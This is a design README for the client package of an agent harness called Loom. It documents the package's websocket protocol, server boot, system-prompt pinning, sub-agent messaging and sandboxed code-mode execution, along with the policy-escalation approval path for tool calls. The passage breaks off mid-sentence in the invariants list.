# client

## Purpose

The ClientGateway and the session server: the outward face of a live
session. It owns the Part 1.6 websocket protocol as total Gleam codecs,
a per-session hub actor that speaks it to any number of attached
connections, the `mist` websocket transport under that hub, the bridge
that decodes stored escalation JSON back into typed broker grants, the
scripted end-to-end demo that drives the whole M3 flow through the
protocol alone — and, as the tree's host package, the production wiring
adapter (`client/wiring`, promoted from conformance), the system
prompt's assembly and its durable pin (`client/system_prompt`), the two
seams that give a model other agents and code mode (`client/agency`,
`client/codemode`), plus the
`loom-server` entry point (`client/serve`) that boots the whole stack
over one session file. WP-L.

## Key Types

- `client/protocol.{CommandEnvelope, Command}` — the client→server
  envelope `{v, id, cmd, body}` and its fourteen commands (`Subscribe`,
  `CatchUp`, `Prompt`, `Steer`, `FollowUp`, `Abort`, `Approve`, `Deny`,
  `Fork`, `Navigate`, `Compact`, `CreateStrand`, `ListModels` (wire
  name `models`), `SetConfig`) plus `UnknownCommand`, which keeps an
  unrecognized name as data.
- `client/protocol.{EventEnvelope, Event}` — the server→client envelope
  `{v, reply_to?, event, seq?, body}` and its events (`SnapshotEvent`,
  `EntryEvent`, `OpTransitionEvent`, `StreamDeltaEvent`, `UsageEvent`,
  `EscalationEvent`, `StrandResultEvent`, `ErrorEvent`, `UnknownEvent`),
  with `Snapshot`, `Strand`, `LiveOp`, `EntryRecord`, `EscalationRecord`,
  `Denial`, and `ModelInfo` as the body shapes (`ModelsSnapshot` is the
  `models` command's reply).
- `client/protocol.ProtocolFault` — what a malformed frame decodes to;
  nothing here crashes.
- `client/gateway.{Gateway, Options, Message, start}` — the hub actor,
  one per served session, over a `runtime/api.Runtime`.
  `with_catalog` and `with_registry` supply the two things `set_config`
  validates against: the model catalogue behind `model_name`, and the
  live tool registry behind `active_tools` (the same registry the
  effect wiring dispatches through; without one, active-set changes are
  refused in band).
- `client/gateway.{attach, detach, handle_text}` — the transport seam: a
  connection is a `fn(String) -> Nil` sink, inbound frames arrive as
  text, and nothing in the module knows about sockets.
- `client/gateway.{commit_forwarder, supervised_commit_forwarder,
  tap_provider}` — the two composition-layer seams: the runtime writer's
  post-commit publication becomes a pull hint, and an injected
  `effects.ProviderSurface` is wrapped so provider deltas tee to the hub
  while the runtime's effect process consumes the stream unchanged. The
  forwarder registers under a name and the writer subscribes to that
  name, which is what lets it be supervised and restarted without the
  writer noticing.
- `client/server.{Config, Auth, Server, serve}` — the `mist` websocket
  transport on `/v1/ws`; `LocalAuth(token_path)` mints a startup token
  into a `0600` file, `BearerAuth(token)` is the caller-supplied one.
- `client/install.{root, helper, helper_name, gleam_compiler, erl, seed,
  seed_directory, existing_file, existing_directory, bundled_helper,
  bundled_seed, first_of}` — where this Loom is installed, and what ships
  beside it. `root()` is `code:root_dir()`: the unpacked release tree for
  a release, the OTP installation root for every other run. Everything
  else is a path built onto it and *probed*, so existence is the whole
  discriminator and nothing special-cases a development host. `erl()`
  names `erts-<vsn>/bin/erl` with the version read from the live system
  rather than globbed for, so it is the emulator actually running the
  harness. `first_of` is the ladder itself — the first rung that answers
  wins, and no rung below it is evaluated.
- `client/grants` — decoding the runtime's opaque escalation JSON back
  into `broker/policy.Grant`, and encoding it again. Pure and total.
- `client/escalate.{Config, Message, Refused, Decision, Escalations,
  seam, start, none, record_id, action_digest, action_preview,
  default_config}` — parking: what a production tool call does when the
  broker refuses it on policy. `seam` closes over a process *name* (the
  Agency's knot, the Agency's answer) and `start` puts the runtime
  behind that name after `api.open`; `record_id` is the deterministic
  `{strand, tool, wanted diff}` digest a retry loop dedupes onto, with a
  limit grant contributing its field and not its model-supplied
  magnitude; `action_digest` is the *other* identity, over the call's
  effective arguments canonicalised (objects key-sorted recursively,
  arrays left ordered), which is what an approval binds to;
  `action_preview` is its bounded human rendering, display-only and cut
  at 2 KB on a codepoint boundary; `Config.max_records` caps the
  distinct wants a session will file and `Config.max_asks` caps the
  questions any one of them may put; `none()` is the no-plane seam under
  which a refusal settles exactly as it did before escalations existed.
- `client/gateway.attached` — how many connections are attached right
  now. The honest answer to "is a human there?", which is what the
  escalation seam asks before it holds a call open. A hub that is gone,
  that dies mid-question, or that does not answer inside a second all
  count as nobody attached rather than exiting the asker.
- `client/catalog.{Catalog, CatalogModel, Dialect, parse, gateway}` —
  the model catalogue: a total, strict parser for the `loom.toml`
  format (via the `tom` TOML package; `docs/examples/loom.toml` is the
  worked example) and the builder that turns a catalogue into the
  provider gateway's registry — one provider per entry, named by the
  entry (so durable identities store `{catalogue-name, model_id}`),
  one route per `[roles]` row. The hub serves it as the `models`
  listing and resolves `set_config`'s `model_name` against it; `serve`
  loads it from `--config` or shapes a one-entry catalogue from the
  `LOOM_*` environment.
- `client/demo.run` — the M3 acceptance flow end to end, executed as a
  test and runnable as `gleam run -m client/demo`.
- `test/client/tui_e2e_test` + `test/support/terminal` — the real
  `loom-tui` binary against a real `serve.boot`, in a real terminal
  (`tmux` on a private socket, declared geometry, every wait a predicate
  over pane content with a deadline). The only test in the tree with a
  fake on *neither* side of the protocol; only the model is scripted.
  Skips — loudly — when `tmux` or `go` is absent.
- `client/agency.{Config, Message, seam, start, reaping_hooks,
  child_name, is_subagent, frame_message, frame_brief, result_contract,
  result_schema_prefix}` — the Agency:
  `tools/agent`'s messaging seam implemented over a live runtime. `seam`
  closes over a process *name* so it can be built before `api.open`;
  `start` puts the returned runtime behind that name. Everything with
  teeth lives here — the descendant-only addressing rule, the depth and
  fan-out caps, the multi-handle wait loop, the lineage ledger's four
  reconciliation branches, the lazy deadline reap, the result contract a
  spawn's `result_schema` writes and the child is judged against, and the
  framing that marks another agent's text as data. `child_name` mints
  `sub:{parent}/{slug}-{digest}`, the digest being
  `agent.call_site_digest` over the caller's coordinates and the `Minter`
  inside them.
- `client/codemode.{Config, Toolchain, seam, discover, default_config,
  execute, exec_config, build_config, exec_root, execution_policy,
  translate, pooled_budget}` — code mode: `tools/codemode`'s seam
  implemented over the real pipeline, the other package this one exists
  to join (`tools` cannot see `codemode`, which already depends on it).
  `discover` locates `gleam`, `erl` and a verified build seed or says
  what is missing *and how to supply it*, each executable through
  `locate` — the tree this server shipped in first, `PATH` second;
  `seam` closes over a `Config` and needs no process
  name, because the broker it dispatches through already exists;
  `execute` prepares a per-execution directory, drives vet → compile →
  run under the caller's own `{op_id, step_id}`, restates the pipeline's
  two enforcement reports in the tool's vocabulary, and removes the
  directory again. `Config` carries no `vet_policy` of its own: it
  carries `surface`.
- `client/codemode.launch_refusal` — what policy composition would
  refuse a satellite launch for: `tools/codemode.RunRefused` carrying the
  exact grants that would satisfy it, or `NothingRefused`. `execute`
  wraps the pipeline's `satellite.Launcher` with it and reports the
  answer outward beside the outcome, which is the whole of what makes an
  escalation record *mintable* from inside code mode (#97). Public
  because it is the wrapper's entire decision and the only part of it a
  hermetic test can hold still.
- `client/codemode.{Surface, Seams, serving, orchestrating,
  surface_seams, surface_seam, seam_policy, seam_caps, tool_seam,
  vetting_seam}` — which code-mode seams this host serves.
  `Surface` is `Workspace`, `Orchestration(agency, spawn_ceiling)` or
  `Both(...)`: one field, because the vetting allowlist, the capability
  router and the spawn ceiling have to agree and a host that could set
  them apart would eventually set them apart. `Seams`
  (`WorkspaceOnly` / `OrchestrationOnly` / `BothSeams`) is the same
  choice as a *setting* — what a flag can carry before there is an
  `Agency` to serve the orchestration seam with — and `serving` turns
  one plus an Agency into a `Surface`; `orchestrating` is the
  orchestration-only case of it. `seam(config)` publishes exactly the
  seams the surface serves as `tools/codemode.Seams`, each with the
  allowlist and the serviced capabilities read off the running policy,
  so what the model may ask for and what will judge it cannot drift.
  `tool_seam` / `vetting_seam` are the two directions of the mirror
  between `vet/policy.Seam` and the tool's own `Seam`.
- `client/system_prompt.{Host, Rendered, Assembled, Origin, assemble,
  render_pack, pack_source, guidance, pinned_in, pinned, pin}` — the I/O
  half of the pure `prompt` package. `Host` is every `pack.Environment`
  field gathered from a real source; `pack_source` picks the shipped pack
  or the one `LOOM_PROMPT_PACK` names; `render_pack` renders it or
  refuses; `assemble` chooses between the `LOOM_SYSTEM_PROMPT` override,
  the pinned cell and a fresh render; `pinned_in`/`pinned`/`pin` are the
  two ends of the reserved `prompt/` cell. Nothing here is called per
  turn — the whole module runs once, at boot.
- `client/wiring.{Config, build_effects}` — the production effect seam:
  a `runtime/effects.Effects` over the real provider gateway, broker,
  and tool registry (promoted from `conformance/wiring`; spec-gaps M2
  item 7). The conformance wiring/e2e suites still prove it.
  `Config.escalations` is the escalation seam a policy refusal goes
  through — from `escalating_runner` for a refusal the broker handed
  back, and from the `Ctx.raise_refusal` seam for one a tool met
  elsewhere; both build the same `escalate.Refused` from the same
  `ToolRun`. There is deliberately **no** session-wide grant list,
  because a grant that cannot be attributed to the call in hand must
  widen nothing.
- `client/wiring.{compaction_hooks, recording_summaries}` — the two
  halves of live compaction, separable so a host with its own provider
  surface can run the real ones. `compaction_hooks` builds the whole
  `effects.Hooks` record through `runtime/hooks`: real admission from
  the gateway's resolved model facts, threshold and overflow over the
  strand's durable projection, `VerdictGenerate` for every structural
  decision, and the progress hook. `recording_summaries` wraps a
  provider surface so a settled summary is filed in the sink on its way
  past — the same composition shape as `gateway.tap_provider`.
- `client/wiring.{summary_provider_request, settlement_of,
  summary_progress, resolution}` — the summary path in pieces: the
  request a structural summary is made as, how a settled response reads,
  what the sink's record means to the machine, and whether a captured
  identity still routes.
- `client/summaries.{Summaries, Settlement, Record, start, stop, pid,
  key, record, read}` — the summary sink: a small bounded actor keyed by
  `(operation, task, attempt)`, the rendezvous between the effect
  process that receives a summary and the driver process that reports on
  it. Nothing here is durable, on purpose; see Invariants.
- `client/system_prompt.{summary_pack, summary_pack_variable}` — the
  summarization pack this boot summarizes with: the shipped one, or the
  file `LOOM_SUMMARY_PACK` names.
- `client/serve.{default_reserve_tokens, default_keep_recent_tokens}` —
  pi's compaction defaults, and the only place they are stated.
  `LOOM_COMPACTION`, `LOOM_COMPACTION_RESERVE` and
  `LOOM_COMPACTION_KEEP_RECENT` override them; settings that cannot
  describe a working compaction disable it rather than firing a
  threshold that prepares nothing.
- `client/serve.registry(Option(Agency), Option(CodeMode))` — the tool
  registry: five core tools, plus the six `agent_*` tools only when a
  messaging plane exists, plus `code_mode` only when this host wired a
  code-mode pipeline.
- `client/serve.Settings.codemode_seams` — which code-mode seams this
  server offers (`--codemode-seams workspace|orchestration|both`,
  default `WorkspaceOnly`). A setting for the same reason
  `base_policy` is one: the choice belongs to whoever stands the server
  up, and the Agency the orchestration seam routes onto does not exist
  until `boot` has built it. An unrecognised flag value is a usage
  error, not a fallback — a typo that quietly served the workspace seam
  would look exactly like a server ignoring the flag.
- `client/serve.Booted` — what `shutdown` takes apart, plus three things
  it is asked about: `prompt: system_prompt.Assembled`, the exact bytes
  this boot handed the wiring (so a test can prove the pinned prompt is
  the one on the wire and the startup line can name its digest);
  `services`, the supervisor over the restartable composition layer;
  `stops`, the subject the host reports a `SIGTERM` or a fatal fault on,
  owned by whichever process called `boot`; and `helper_path`, the
  `loom-exec` the ladder settled on, carried so the listening line can
  name the binary that will enforce every jail this session builds.
- `client/host.{Stop, adopt, relay_sigterm}` — the root of the server's
  process tree. `adopt` runs a boot on a dedicated exit-trapping process
  so every link an `actor.start` forms lands there rather than on the
  caller; the first fatal death runs the teardown *first* — releasing
  the session lease — and reports `Faulted` afterwards, leaving the exit
  status to the entry point. `relay_sigterm` puts the signal on the same
  subject, so one receive covers both ways the server stops.
- `client/serve.boot_with(settings, logger:)` — `boot` with an injected
  `telemetry/log.Logger`, which is what `main` calls once it has
  installed the JSON handler. The logger is a capability, not a setting
  (§0.2): it is passed rather than parsed, and `boot` itself delegates
  here with `log.discard()` so an embedding test boots a whole server
  without a handler existing at all.
- `client/serve.{Settings, boot, shutdown, main}` — the server entry
  point (`gleam run -m client/serve`, `bin/loom-server` via the erlang
  shipment): flags/env in, session + helper pool + broker + system
  prompt + runtime + service supervisor + websocket server up, one
  startup line out, and either `SIGTERM` or a fatal fault runs the same
  `shutdown` so the lease is released rather than left to its TTL.
  `client.main` delegates here for the shipment's entrypoint.
- `client/serve.{helper_ladder, seed_ladder}` — the two lookup orders,
  taken as rungs rather than performed inline, because *order* is the
  whole of what they decide and a lookup against the host running a test
  cannot show an order. `helper_ladder` is `--helper`, the tree this
  server shipped in, `PATH`, `./bin`; `seed_ladder` is `--codemode-seed`,
  the workspace's own seed, the bundled one, and a named path for the
  refusal to point at when nothing answers.
- `client/serve.{shell_path, base_policy, degraded, helper_probe_ms}` —
  the host facts the system prompt and the jail must agree on: the shell
  jailed commands run under, the *default* session base policy, and the
  one question the prompt has no other source for — whether a helper's
  hello advertises `degraded`, asked once at open by borrowing from the
  pool the session will use anyway.
- `client/serve.Settings.helper_pool_size` — how many `loom-exec`
  helpers may run at once, and therefore the real ceiling on how wide a
  parallel tool batch runs. `resolve` fills it from `LOOM_HELPER_POOL`
  or `exec.default_pool_size()` (schedulers online), never a literal, and
  clamps *both* to `[exec.min_pool_size, exec.max_pool_size]` = `[4, 16]`.
  Both ends are load-bearing: below two, code mode cannot run at all (a
  satellite holds one helper for the node while the program's capability
  calls ask for another), and above sixteen an operator's typo would ask
  the host for that many live bwrap jails. A batch wider than it waits for a slot
  inside `broker.clear_call` rather than coming back as a resource
  error. Distinct from the broker's pooled `max_outstanding`, which
  refuses amplification rather than describing what the host affords.
- `client/serve.Settings.base_policy` — the base every tool call is
  composed against, and the thing an escalation widens. A field rather
  than a `base_policy(workspace)` call inside `boot`, so a host may serve
  a narrower base and let approvals widen it per call; `main` fills it
  with `base_policy(workspace)`. Under the default nothing can park (see
  Invariants), which is what made the escalation plane unreachable from
  an end-to-end until `client/tui_e2e_test`.

## Relationships

- **Depends on**: `core` (json, codec, entries, messages), `session`,
  `runtime` (`api`, `effects`, `escalation`, `supervisor`, `writer`),
  `events` (the bus as a hint source), `storage` (catch-up scans),
  `machine` (`acceptance`, `queue`, `codec` — the commands with no api
  entry point build their own plans), `broker` (`policy.Grant`,
  `escalation` vocabulary), `provider` (`stream.Delta` for the tap),
  `prompt` (both packs, the decoder, the renderer, and the
  summarization assembly in `prompt/summary`),
  `codemode` (the vetting policy, the hermetic compile service, the
  production builder and launcher, and the satellite host — the pipeline
  `client/codemode` fills the `tools/codemode` seam with),
  `telemetry` (the JSON handler this entry point installs, and the
  logger it injects into `api.Options`),
  `mist` + `gleam_http` (the websocket transport), `simplifile` (the
  token file, the pack file, and the workspace's `CLAUDE.md`).
- The spec DAG (§0.1) writes `L → A,C,E,K`. The `B`, `D`, `F`, and `G`
  edges are real and load-bearing — catch-up scans storage directly,
  compaction and navigation build `machine/acceptance` plans, the delta
  tap types against `provider/stream`, and grants are broker policy
  values — and are worth knowing about rather than papering over. The
  wiring promotion added `tools` (the registry and per-call `Ctx`);
  `client/serve` added `argv` (flags); `client/catalog` added `tom`
  (the pure-Gleam TOML parser behind `--config`); `client/system_prompt`
  added `prompt`, whose purity is why the I/O had to live on this side.
- **Depended on by**: `conformance`, whose wiring and e2e suites import
  `client/wiring` (legal — T depends on all). `packages/tui` is its Go
  client, coupled only through the protocol and the golden fixtures.
- **FFI**: `client/internal/ffi_os` over `client_ffi.erl`, serve-only:
  wall clock, unique entropy, `PATH` lookup, `code:root_dir/0` and the
  running ERTS version (the anchor `client/install` builds every
  in-tree path from), `os:type`/machine
  architecture for the prompt's platform line, the SIGTERM relay,
  `sys:terminate/3` for stopping the service supervisor the way OTP
  stops one, and the documented exit-code halt. Test-side, `client_test_ffi.erl` is a
  minimal websocket probe for the boot smoke.

## Traffic

- **Actor messages**: `gateway.Message` — `Attach(sink, reply)` (a call,
  returning the connection id), `Detach(connection)`,
  `FromClient(connection, text)`, `CommitHint`, `BusHint(published)`, and
  `ProviderDelta(operation, delta)` (casts). Senders: `client/server`'s
  socket handlers, `commit_forwarder` (from `runtime/writer.Event`),
  `events/bus` subscriptions, and `tap_provider`'s wrapper.
- **Commits**: the hub commits nothing of its own except through the
  session's one writer. Commands map onto `runtime/api`
  (prompt/steer/follow-up/abort, escalation approve/deny, strand
  creation); `compact` and `navigate`, which have no api entry point yet,
  build a `machine/acceptance` plan and commit it through
  `runtime/writer` — the same pattern the conformance simulation runner
  uses. Nothing bypasses the writer.
- **Registers**: reads `strand.*` (configuration, leaf, state, last
  result) and `op.meta`/`op.state` through the session's typed accessors
  to build snapshots and detect terminals; reads the runtime's escalation
  records under `fact.custom`'s reserved `escalation/` prefix, and the
  assembled system prompt under the reserved `prompt/` prefix — read off
  the session store directly before `api.open`, written back through
  `api.put_reserved_fact` after it. Strand
  seeding for protocol `fork` and `create_strand` writes `strand.config`
  / `strand.leaf` / `strand.state` (the api's creation path always takes
  a task brief, so the gateway seeds idle strands itself).
- **Wire**: JSON text frames over websocket. The envelope `seq` **is the
  storage seq** of the write that produced the event, so the durable
  stream needs no side index and `catch_up` rebuilds it with
  `scan_entries` / `scan_usage` plus register reads.

## Invariants

- **Envelope decoding is strict; name decoding is tolerant.** `v` must be
  `1`, the discriminator must be present, and a command `id` must be
  present and positive. Unknown `cmd`/`event` *names* survive as
  `UnknownCommand` / `UnknownEvent` so the receiver can answer in band;
  unknown *fields* inside known bodies are ignored (forward compatibility
  within v1).
- **Everything in `protocol` is pure and total.** Malformed input is a
  `ProtocolFault` value, never a crash.
- **Durable JSON crosses verbatim.** Gateway-defined field names are
  `snake_case`, but values that already have a durable form in the
  harness — entries, messages, usage — are carried in `core/codec`'s
  vocabulary (pi field names, camelCase) rather than re-rendered.
- **The wire form is pinned by the Go golden fixtures** under
  `packages/tui/internal/proto/testdata/`, which this package decodes and
  re-encodes byte for byte. Three details differ from `core/codec` and
  the wire follows the fixtures: `toolCall` blocks nest under a
  `toolCall` key, `thinking` blocks always carry `redacted`, and floats
  print positionally (`0.00027`, not `2.7e-4` — see
  `protocol.to_wire_text`). Changing either side is a protocol change,
  never silent drift.
- **Immutable rows replay exactly; register-backed events replay as
  current state.** `entry` and `usage` events are scanned by seq range,
  so a resume reproduces them; `op_transition`, `escalation`, and
  `strand_result` are read from registers, which keep no history, so a
  superseded phase is not reconstructible. Events are hints and the
  snapshot carries live state, so a client that missed an intermediate
  phase still converges — overlap and gaps are resolved by seq dedup, as
  the protocol already requires.
- **The writer's post-commit publication is production's hint source,
  and `serve` supplies no bus** (issue #8's aside, decided). A
  one-session server's writer and hub share a VM, so
  `commit_forwarder` already carries every commit; adding a bus
  subscription would trigger the same pull twice. `Options.bus` remains
  for a host whose hints are not all its own writer's — a projection, a
  second node's session, telemetry — which is what `events/bus.bridge`
  exists to feed.
- **Live materialization is a pull, never an apply.** Both the writer's
  post-commit publication and any bus publication merely trigger a pull
  from storage above the hub's high-water seq; a lost hint costs latency,
  never an event.
- **Stream deltas are ephemeral.** They are broadcast without a seq,
  never persisted, and the tap lives entirely in the composition seam —
  the runtime is untouched by it.
- **Every upgrade without the exact bearer token is answered `401`**
  before any websocket state exists. `LocalAuth` binds loopback and puts
  the token in a `0600` file next to the session, moving the
  peer-credential check into the filesystem, because `mist` has no
  unix-socket listener to carry `SO_PEERCRED`.
- **A strand's durable `active_tool_names` is canonical: sorted, with
  duplicates collapsed, and every name registered.** The list renders
  into the request's tool array, which sits ahead of the system prompt
  in the provider's render order, and prompt caching matches on an
  exact byte prefix — so a reordering costs both cache-head writes on
  every subsequent turn. The hub canonicalizes at the `set_config`
  boundary and `client/wiring.tool_specs` sorts again at render.
  Neither moves the authorization line: `wiring.clear` admits a call by
  `list.contains` on this same list, and set membership is blind to
  order and multiplicity.
- **The system prompt is assembled once, at a session's first open, and
  pinned.** Every later boot sends the pinned bytes rather than deriving
  them again — the agent may have edited `CLAUDE.md`, the kernel may have
  changed under a restart, a flag may differ, and a prompt re-derived
  from moved inputs is a full one-hour cache write on the first turn
  after every restart. The pin lives in the reserved `prompt/` cell, so
  no model-reachable `put_fact` can rewrite the operator's channel.
- **The pin is read before `api.open` and written after it.**
  `wiring.Config.system` must hold the string before the open, and the
  open is what stands the writer up — so the cell is read straight off
  the session store while nothing owns it, and written back through
  `api.put_reserved_fact` once there is a writer to journal it. Same knot
  as the Agency's, solved by ordering rather than by a name because the
  value is data, not a process.
- **Nothing volatile may enter `system_prompt.Host`.** No clock, date,
  elapsed time, token count, cost, git state, id, strand name or random
  value — and no numeric field at all, which is the shape all of those
  arrive in. The list fields are sorted and de-duplicated by
  `pack.environment` before they can reach the bytes, for the same reason
  the tool array is sorted: both sit inside the cached prefix.
- **A prompt pack refuses loudly or serves; it never disappears.** A pack
  file that cannot be read, does not decode, or renders to nothing stops
  the boot with a worded message naming the file and the fault — a
  silently-empty system prompt is the failure this seam exists to end. A
  pack that merely trips `pack.problems` (a dropped section, a misspelled
  placeholder) warns on stderr and serves: `decode` accepts more than
  `problems` approves by design, and a thin prompt beats a dead server.
- **The Agency is reached through a name, never through a captured
  runtime.** `api.open` takes the `Effects` record and returns the
  `Runtime`, and `Runtime` *contains* `effects` — so a closure reachable
  from `Effects` that captures the `Runtime` is a value cycle, not an
  ordering problem. `agency.seam` closes over a minted process name (the
  same indirection `gateway.commit_forwarder` uses) and `agency.start`
  stands a holder up under it after the open. The holder answers exactly
  one message and answers it with the runtime *value*: the tools do the
  work on their own effect process, because a holder that did the work
  would serialize every agent call in the session behind whichever one
  was inside a wait.
- **A strand may wait only on a descendant and address only its parent or
  a descendant** — decided from the durable lineage ledger, never from
  anything a model says. A strand with no lineage cell is a root and is
  nobody's descendant: "no lineage fact" fails closed. That is what makes
  the wait graph acyclic and a blocking `agent_wait` safe.
- **A reap does one thing on the driver process: `spawn_unlinked`.**
  `Hooks.run_end` fires inside `drive_loop`, on the driver, before any
  `actor.continue` — so a hook that read a register would be a
  `call_forever` from the driver and a hook that waited would stop it
  serving `Nudge`, `RequestAbort` and `PollTick`, which is exactly the
  property that makes a blocking tool safe. Every read, abort and commit
  a reap performs happens on the spawned process. The hook carries no
  strand and does not need one: a lineage cell records the *operation*
  that minted it, so "reap what this run spawned" is a ledger predicate.
- **A reap's intent is durable and its abort is re-issued.** `api.abort`
  is a no-op when no driver is registered, so a reap that landed
  mid-restart would otherwise evaporate and the child would run until the
  session closed. The mark is written once and every later observation
  re-issues the abort.
- **A spawn adopts an existing child on a name match only when the ledger
  says this caller minted it.** Handing an existing child back is the
  reconciliation path that makes `agent_spawn` `ReplaySafe`, and it is
  worth keeping — but a name is *derived* and a lineage cell is
  *recorded*, and only the second is evidence. So `minted_by` is compared
  against the caller's own call site — the operation, `agent.minting_step`
  (the step with the minter folded in, since `lineage.CallSite` has no
  field for a program's ordinal) and the source index — and a mismatch is
  refused as `agent.NameAlreadyMinted`, never adopted. Adoption without
  that check is an ownership transfer rather than a reconciliation: the
  adopting spawn's brief, tools, `within_ms`, `detach` and `result_schema`
  are all discarded (`write_result_schema` runs only on the minting
  branch), `check_capacity` is skipped so the adopted child costs nothing
  against `fan_out`, and the caller goes on to wait on a strand doing
  somebody else's work and report its answer as the answer to a question
  it never asked. The name derivation is what makes a collision
  unreachable; this is what makes one harmless if it were reached.
- **The blackboard is clamped on both sides.** `agent_note` writes under
  `agent/{caller}/`; `agent_notes` with no prefix reads `agent/` and not
  the whole non-reserved fact namespace, which is what
  `api.facts(prefix: None)` would hand back.
- **A result contract is enforced on the child's write, not on the
  parent's read.** A spawn's `result_schema` is stored at
  `result-schema/{child}` — written *before* the lineage cell, so a crash
  between the two can leave a schema with no child and never a child
  whose contract vanished — and quoted into the child's brief. The check
  then runs inside `note`, on the child's own `agent_note` call, because
  the child is the party that can repair the value and the moment it can
  repair it cheaply is the run that produced it; checking only at the
  join would tell the one party that cannot act. `wait` validates again
  on the way out, not as a second authorization but because the cell
  comes back out of the durable store and a value crossing that boundary
  is decoded rather than trusted. The contract cell sits outside
  `agent/`, which is the whole of what keeps it out of a model's reach:
  `agent_note` prepends `agent/{caller}/` and `agent_notes` lists under
  `agent/` alone, so a child can neither rewrite what it is judged
  against nor read what its siblings were asked for.
- **A report into a *finished* parent is refused.** `api.send_to_strand`
  accepts a fresh run when the target is idle, which would wake a
  finished parent with no human present — the exact property auto-
  enqueued child results were rejected over. The refusal is upward only:
  a parent giving an idle child more work is a live agent's explicit
  decision inside its own run.
- **A code-mode submission is judged against the seam it named, and
  routed by the seam the host wired.** The two halves are read from
  different places on purpose. The allowlist follows the *submission*
  (`exec_config` takes its vetting policy from `Request.seam`), so a
  refusal the model reads is about the surface it asked for. The router
  and the spawn ceiling follow the *surface*, so a host serving one seam
  hands out that seam's router whatever a request names and no
  submission can widen what the operator wired. A request naming a seam
  the surface does not serve is refused by the tool shell before
  `execute` is called and again by `execute` itself — `StartFailed`,
  nothing dispatched, both stages unreported — rather than being
  reinterpreted as the seam the host does serve. The residual mismatch
  that arrangement allows can only narrow: a program vetted against one
  seam's imports and routed by the other's cannot import the modules
  whose calls that router services, so it reaches nothing at all.
- **A code-mode policy refusal is raised once, for the whole execution,
  and only from the satellite launch.** Code mode clears through the
  broker the pipeline holds rather than through `Ctx.clear_call`, so
  until #97 a refused execution reached no escalation plane and nothing
  could mint the grants #24 taught it to spend. `execute` now wraps the
  pipeline's launcher, re-asks the launch's own composition question
  (`launch.node_requirements` ⊕ the base ⊕ the identity's grants, so
  there is nothing to drift), and reports the shortfall outward as
  `tools/codemode.RunRefused`; `wiring.tool_context` supplies the raise
  seam that turns it into a durable record, and the tool shell
  re-executes once on an approval. Three clearance points, one raise: the
  hermetic build composes with the grants already dropped, so no approval
  can widen it and the question would be unanswerable; a capability call
  refused inside a *running* program is refused after effects have
  happened, and the one thing an approval buys is a re-execution, which
  `replay: tool.Never` says must never happen. The launch is the only one
  where nothing has run yet, so the re-execution repeats no effect and
  the action a human consents to is still the whole submitted program.
- **The action a code-mode approval binds to is the program.**
  `wiring`'s raise builds `escalate.Refused` with `tool: "code_mode"` and
  `arguments: run.arguments` — the same post-clearance arguments the
  broker path uses — so `record_id` digests `{strand, "code_mode", wanted
  diff}` and `action_digest` digests the submission. A retry of the same
  program inherits the approval and spends it; a *different* program
  wanting the same diff lands on the same record id, fails the action
  binding, and re-opens the question with no grants (#65). That is the
  seam where consent would most easily leak, because the want is coarse
  and the program is everything.
- **A code-mode execution runs under the calling strand's own
  `{op_id, step_id}`.** The hermetic build, the jailed `erl`, and every
  capability call the running program makes are dispatched under that one
  pair, which *is* the execution identity the broker pools budget under —
  so the compile and the run share one ledger and one wall deadline
  rather than minting a second budget, and `broker.abort` on the
  operation reaches the build and the node alike. The pooled
  outstanding-effect cap is never below two: the node holds one for its
  whole life.
- **Both jailed stages' enforcement reports travel in the outcome.**
  `pipeline.execute` returns them beside the outcome — the build's from
  `compile.Compiled`, the node's from `satellite.Run`, whose report is
  what `CapConnection.destroy` returns — so this module does not wait on
  a mailbox and has no grace period to lose. It only restates them as
  `tools/codemode.Report`, splitting the helper's `skip:` entries out of
  the applied list so no renderer can present a skipped layer as an
  enforced one (issue #5).
- **The only thing the code-mode wiring adds to a session base is two
  environment *names*.** `LOOM_CAP_SOCK` and `LOOM_CAP_TOKEN_FILE` are
  set by the launcher and cannot be shadowed by a caller's `env`, but
  policy composition takes the meet — so a base that does not name them
  composes them away and the satellite cannot find the channel it exists
  to speak on. `execution_policy` adds exactly those two and leaves every
  other dimension untouched; it is one small named function so it stays
  auditable rather than diffusing into the wiring.
- **An execution's files live in their own directory inside the
  workspace,** named for `{op_id, step_id}` and removed when the
  execution settles. Inside the workspace, so the session base already
  makes it writable and nothing has to be widened to build there; unique
  per execution, so two strands running code mode at once cannot share a
  build root. The directory's name is a short digest of that pair rather
  than the pair itself, because the cap socket sits inside it and an
  AF_UNIX path is capped near 108 bytes — a socket that would exceed the
  limit is refused in band, naming the workspace, instead of failing as an
  opaque `einval` from `listen`.
- **Registration is gated on the seam, for both families.** A host with
  no messaging plane ships no `agent_*` tools and a host with no
  toolchain or no prepared build seed ships no `code_mode` — the boot
  says which is missing, once, as a `codemode.unavailable` log line, and
  the registry it actually built as `server.tools`. The wire tool array
  is the byte prefix of the provider's cached region, so a
  permanently-refusing definition would be paid for on every request of
  every strand for the life of the session. **The message is part of the
  mechanism, not decoration**: it is the only thing anybody will ever
  see about an absent code mode, because there is no tool left to fail
  later, so it names what is missing, both places that were looked, and
  the way to supply it. A working host logs `codemode.ready` with the
  `gleam`, the `erl` and the seed it settled on.
- **A component of Loom is looked for in Loom's own tree before `PATH`.**
  The helper, the emulator and the compiler are all located from
  `code:root_dir()` first (`client/install`). For `loom-exec` that is a
  security property rather than a convenience: it is the binary that
  builds the namespaces and applies Landlock and seccomp, so a stray one
  an unrelated install left on `PATH` must not outrank the audited one
  shipped in the same tree as the running server. An explicit `--helper`
  still outranks both, because that is how an operator points at a helper
  they audited themselves, and a flag naming a missing file refuses
  saying so rather than falling through to one they did not choose.
- **Approved grants are validated structurally against the wanted diff**
  before being stored back in the runtime's internal vocabulary, so the
  consume path hands a re-execution exactly what was approved.
- **A grant reaches a policy decision through the call it was approved
  for, and by no other route.** `wiring.tool_context` builds `Ctx.grants`
  from `effects.ToolRun.grants` — what *this call's* clearance consumed —
  decoded from the escalation vocabulary here, because the runtime moves
  those payloads opaquely. A payload that will not decode is dropped
  rather than faulted on: skipping a grant can only narrow what the call
  receives, and the call still settles in band under whatever remains.
- **A base that covers every shipped tool can never park.** Composition
  refuses only when a tool's requirements exceed the base, and
  `base_policy` grants read of `/`, writes to the workspace, and the four
  environment names `bash` passes — which is every requirement any
  shipped tool has, since all of them are static rather than derived from
  call arguments. So the default posture is one where the escalation
  plane is real but dormant, and a host that wants approvals to mean
  something serves a narrower `Settings.base_policy`. This is why the
  base is a setting: a test cannot otherwise boot a real server into a
  state where a refusal happens at all.
- **Every policy refusal raises a durable record; only some park.** The
